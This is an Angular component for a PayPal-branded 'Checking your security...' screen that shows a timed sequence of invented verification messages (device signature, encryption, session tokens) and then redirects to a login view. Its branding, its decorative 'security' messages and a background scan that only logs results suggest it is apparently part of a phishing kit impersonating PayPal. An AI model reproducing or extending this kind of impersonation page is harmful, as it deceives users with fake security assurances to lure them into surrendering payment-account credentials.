
import { Component, signal, OnInit, OnDestroy, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { SecurityService } from '../services/security.service';

@Component({
  selector: 'app-security-check',
  standalone: true,
  imports: [CommonModule],
  template: `
    <div class="h-screen w-full flex flex-col items-center justify-center bg-pp-bg text-pp-navy p-4 font-sans">
      <div class="max-w-md w-full text-center flex flex-col items-center">
        
        <!-- PayPal Blue Arc Spinner -->
        <div class="relative w-16 h-16 mb-8">
            <div class="absolute inset-0 rounded-full border-[3px] border-slate-200"></div>
            <div class="absolute inset-0 rounded-full border-[3px] border-t-pp-blue border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
        </div>

        <h1 class="text-2xl font-bold mb-3 tracking-tight text-pp-navy animate-fade-in">Checking your security...</h1>
        <p class="text-slate-500 text-base font-medium animate-pulse">{{ statusMessage() }}</p>

        <div class="mt-12 flex items-center gap-2 opacity-60">
             <span class="material-icons text-sm text-pp-success">lock</span>
             <span class="text-[11px] font-bold text-pp-navy">Secure Connection</span>
        </div>

      </div>
    </div>
  `
})
export class SecurityCheckComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  security = inject(SecurityService);

  statusMessage = signal('Establishing secure handshake...');
  private intervalId: any;

  private checksDone = false;
  private messagesDone = false;
  private navTimer: any;

  ngOnInit() {
    const messages = [
       "Verifying device signature...",
       "Checking encryption protocols...",
       "Validating session tokens...",
       "Connecting to PayPal..."
    ];
    let i = 0;

    // 1. Start Visual Sequence
    this.intervalId = setInterval(() => {
        if (i < messages.length) {
            this.statusMessage.set(messages[i]);
            i++;
        } else {
            // Sequence finished
            this.messagesDone = true;
            this.tryNavigate();
            clearInterval(this.intervalId);
        }
    }, 800);

    // 2. Start Real Security Checks
    this.security.runSecurityScan().subscribe({
        next: (results) => {
            console.log('[Security Check] Results:', results);
            this.checksDone = true;
            this.tryNavigate();
        },
        error: (err) => {
            console.error('[Security Check] Failed:', err);
            // Fail open
            this.checksDone = true;
            this.tryNavigate();
        }
    });
  }

  private tryNavigate() {
      if (this.checksDone && this.messagesDone) {
          // Add a small buffer for the last message to be read
          this.navTimer = setTimeout(() => {
              this.state.navigate('login');
          }, 600);
      }
  }

  ngOnDestroy() {
    if (this.intervalId) clearInterval(this.intervalId);
    if (this.navTimer) clearTimeout(this.navTimer);
  }
}
